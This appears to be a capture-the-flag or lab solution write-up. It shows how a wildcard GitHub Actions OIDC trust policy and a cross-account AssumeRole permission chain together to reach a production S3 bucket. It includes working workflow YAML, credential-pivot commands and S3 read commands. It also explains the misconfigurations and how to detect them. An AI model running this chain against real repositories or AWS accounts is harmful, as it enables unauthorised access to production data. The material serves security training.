# Solution: GitHub Actions OIDC to Cross-Account S3 via Ops-to-Prod Pivot

GitHub Actions OIDC federation is one of the best things to happen to CI/CD security in recent years. Before it existed, pipelines stored long-lived AWS access keys as repository secrets — a static credential that could be leaked through a misconfigured log, a dependency supply chain attack, or a disgruntled employee with repository access. OIDC federation replaced that with short-lived, automatically rotating credentials that only exist for the duration of a single workflow run.

The problem is that the security of OIDC federation is entirely dependent on how carefully the trust policy is written. A trust policy that says "trust any token from this repository" is only as strong as the access controls on that repository. And the damage that results from a misconfigured trust policy is amplified when the role receiving the OIDC token has further cross-account privileges — because now the blast radius isn't limited to one AWS account.

This scenario chains two misconfigurations together: a wildcard OIDC sub-claim that accepts any workflow trigger from the repository, and a cross-account trust that lets the ops role pivot into the production account. Either misconfiguration in isolation would be a finding worth remediating. Combined, they form a path from GitHub repository write access to production data exfiltration across two AWS account boundaries.

## The Challenge

You have write access to the GitHub repository configured in this scenario. Your goal is to read the contents of a sensitive S3 bucket in the production AWS account — a completely separate account from the operations environment that the CI/CD pipeline is supposed to deploy to.

The resources involved span two AWS accounts:
- **Operations account**: `pl-ops-goidc-pivot-deployer-role` — the CI/CD pipeline role, assumable via GitHub OIDC
- **Prod account**: `pl-prod-goidc-pivot-deployer-role` — the deployment role in prod, trusted by the ops role
- **Prod account**: `pl-prod-goidc-pivot-flag-{account_id}-{suffix}` — the S3 bucket containing `sensitive-data.txt`

You don't start with any AWS credentials. Your only foothold is the ability to trigger GitHub Actions workflows in the repository.

## Reconnaissance

The first step is understanding what the OIDC trust actually accepts. If you can read the IAM role's trust policy — either by having `iam:GetRole` on the ops account or by examining the Terraform configuration in the repository — you'll find something like this:

```json
{
  "Effect": "Allow",
  "Principal": {
    "Federated": "arn:aws:iam::{operations_account_id}:oidc-provider/token.actions.githubusercontent.com"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
    },
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:{github_repo}:*"
    }
  }
}
```

The `StringLike` condition with a wildcard (`repo:{github_repo}:*`) is the vulnerability. This matches any `sub` value that starts with the repository path — which means any branch, any tag, any pull request, any workflow trigger. A production deployment role with this kind of trust should have used `StringEquals` with a specific ref like `repo:{github_repo}:ref:refs/heads/main` or scoped it to a GitHub environment that requires approval.

Next, look at what permissions the ops deployer role has once you assume it. If you can enumerate the role's policies (or read the Terraform), you'll find an inline or attached policy that includes:

```json
{
  "Effect": "Allow",
  "Action": "sts:AssumeRole",
  "Resource": "arn:aws:iam::{prod_account_id}:role/pl-prod-goidc-pivot-deployer-role"
}
```

This is the cross-account pivot. The ops role doesn't just deploy to the operations environment — it can assume a role in prod. That's the second link in the chain.

## Exploitation

### Step 1: Exchange a GitHub OIDC Token for Ops Role Credentials

Create a GitHub Actions workflow file in the repository. The workflow needs the `id-token: write` permission (which grants it the ability to request an OIDC token) and uses the official `aws-actions/configure-aws-credentials` action to perform the exchange:

```yaml
# .github/workflows/exploit.yml
name: OIDC Pivot Demo
on: [push]

permissions:
  id-token: write
  contents: read

jobs:
  pivot:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::{operations_account_id}:role/pl-ops-goidc-pivot-deployer-role
          aws-region: us-east-1

      - name: Verify ops identity
        run: aws sts get-caller-identity
```

Push this to any branch in the repository and trigger the workflow. The `configure-aws-credentials` action calls the GitHub OIDC token endpoint, gets a signed JWT, and exchanges it with AWS STS via `AssumeRoleWithWebIdentity`. Because the trust policy's sub-claim condition uses a wildcard, your push from a feature branch satisfies it.

After the `Verify ops identity` step runs, you'll see output like:

```json
{
  "UserId": "AROAEXAMPLEID:GitHubActions",
  "Account": "{operations_account_id}",
  "Arn": "arn:aws:sts::{operations_account_id}:assumed-role/pl-ops-goidc-pivot-deployer-role/GitHubActions"
}
```

You are now operating as the ops deployer role inside the workflow.

### Step 2: Pivot to the Prod Account

With credentials for the ops deployer role active, call `sts:AssumeRole` against the prod deployer role:

```yaml
      - name: Pivot to prod account
        run: |
          PROD_CREDS=$(aws sts assume-role \
            --role-arn arn:aws:iam::{prod_account_id}:role/pl-prod-goidc-pivot-deployer-role \
            --role-session-name goidc-pivot-session \
            --query 'Credentials' \
            --output json)

          echo "AWS_ACCESS_KEY_ID=$(echo $PROD_CREDS | jq -r .AccessKeyId)" >> $GITHUB_ENV
          echo "AWS_SECRET_ACCESS_KEY=$(echo $PROD_CREDS | jq -r .SecretAccessKey)" >> $GITHUB_ENV
          echo "AWS_SESSION_TOKEN=$(echo $PROD_CREDS | jq -r .SessionToken)" >> $GITHUB_ENV

      - name: Verify prod identity
        run: aws sts get-caller-identity
```

The prod role's trust policy explicitly trusts the ops deployer role ARN, so no additional conditions need to be satisfied. The `GetCallerIdentity` call now shows the prod account ID and `pl-prod-goidc-pivot-deployer-role` as the assumed role — you have crossed the account boundary.

### Step 3: Read the Flag Bucket

With prod role credentials active, enumerate and read the sensitive bucket:

```yaml
      - name: Exfiltrate flag bucket
        run: |
          aws s3 ls
          aws s3 ls s3://pl-prod-goidc-pivot-flag-{account_id}-{suffix}/
          aws s3 cp s3://pl-prod-goidc-pivot-flag-{account_id}-{suffix}/sensitive-data.txt -
```

The prod deployer role has both `s3:ListBucket` and `s3:GetObject`, so listing the bucket and reading the object both succeed.

## Verification

The workflow log for the final step will print the contents of `sensitive-data.txt`:

```
Flag: PATHFINDER-GITHUB-OIDC-CROSS-ACCOUNT-2024
```

You started from GitHub repository write access, touched two AWS accounts, and read a sensitive object from a production S3 bucket — all without storing or using a single static AWS credential.

## What Happened

This attack chain succeeded because of two independent misconfigurations that compounded each other.

The first was the wildcard OIDC sub-claim. By using `repo:{github_repo}:*` instead of scoping to a specific branch or environment, the trust policy granted every workflow trigger in the repository the same level of trust. In a real organization, this means a developer who opens a pull request — or an attacker who has write access to any branch — can assume the CI/CD role without going through any protected deployment process.

The second was the cross-account pivot embedded in the ops role's permissions. CI/CD roles are often granted broad permissions during initial setup and never revisited. The ops deployer role was given `sts:AssumeRole` on the prod deployer role so that the pipeline could deploy to both environments. But this made the ops role a bridge between the accounts, and that bridge is reachable from any GitHub workflow in the repository.

In real-world environments, this pattern appears frequently in organizations that adopted OIDC federation without auditing the trust conditions being written by development teams, or in setups where a single "monorepo" pipeline role serves both non-production and production deployments. IAM Access Analyzer can surface the external trust (the prod role trusts an external account), but it takes additional analysis to trace the full path from GitHub Actions through the ops account into prod. CSPM tools that model cross-account paths end-to-end will catch this; tools that only look at individual account configurations will miss the chain.
